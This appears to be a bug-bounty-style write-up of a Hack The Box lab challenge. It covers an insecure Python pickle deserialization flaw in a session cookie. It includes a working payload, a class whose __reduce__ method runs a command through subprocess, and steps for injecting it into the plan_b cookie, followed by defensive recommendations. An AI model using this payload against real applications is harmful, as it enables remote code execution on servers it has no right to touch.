# Bug Bounty Report

## Bug Details
- **Target:** [https://app.hackthebox.com/tracks/OWASP-Top-10](https://app.hackthebox.com/tracks/OWASP-Top-10) (baby website rick)

## Bug Description
A security vulnerability has been identified in the target web application that allows for arbitrary code execution via the Python pickle module. The issue arises from the insecure usage of pickle for object serialization.

- **Vulnerable Object:** `<__main__.anti_pickle_serum object at 0x7f17ddb057d0>`
- **Exploitation Method:** Utilizing pickle for object serialization and deserialization.

## Steps to Reproduce
1. Use Burp Suite to intercept the request and identify the cookies, specifically `laravel_session`, `io`, and `plan_b`.
2. Extract the value of `plan_b` from the cookie.
3. Base64-decode the `plan_b` value: `echo '{plan_b cookie}' | base64 -d`.
4. Create an unpickled.py file with the following content:
    ```python
    import pickle
    from base64 import b64decode

    class anti_pickle_serum(object):
        def _initi_(self):
            pass

    cookie = b'<decoded plan_b cookie>'
    unpickled = pickle.loads(b64decode(cookie))
    print(unpickled)
    ```
5. Create pickle.py with the following content to generate the malicious pickled payload:
    ```python
    from base64 import b64encode
    import subprocess
    import pickle
    import os

    class anti_pickle_serum(object):
        def __reduce__(self):
            return subprocess.check_output, (['ls'],)

    pickled = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
    encodedpickled = b64encode(pickled)

    print(encodedpickled)
    ```
6. Run pickle.py to obtain the encoded pickled payload.
7. Replace the original value of `plan_b` in the cookie with the new encoded pickled payload.
8. Inject the modified cookie into the request.

## Expected Behavior
The application should properly validate and sanitize user input, ensuring that the usage of the pickle module does not lead to arbitrary code execution.

## Actual Behavior
The application is vulnerable to arbitrary code execution through insecure usage of the pickle module. This is evidenced by the ability to inject a malicious pickled payload into the cookie, resulting in the execution of arbitrary commands.

## Vulnerability Impact
The identified vulnerability allows attackers to execute arbitrary code on the server, posing a severe risk to the confidentiality and integrity of the web application.

## Proof of Concept
1. Successfully decode the `plan_b` cookie.
2. Generate a malicious pickled payload using pickle.py.
3. Replace the original `plan_b` value with the new encoded pickled payload.
4. Inject the modified cookie into the request.
5. Observe the execution of the arbitrary command (e.g., ls) on the server.

## Affected Components
- Insecure usage of the pickle module in Python.

## Recommendations
1. **Input Validation and Sanitization:**
    - Implement proper input validation and sanitization to prevent the injection of malicious pickled payloads.

2. **Avoid Using Pickle for Untrusted Data:**
    - Refrain from using the pickle module to serialize or deserialize untrusted data.

3. **Security Auditing:**
    - Conduct regular security audits to identify and remediate potential vulnerabilities in the codebase.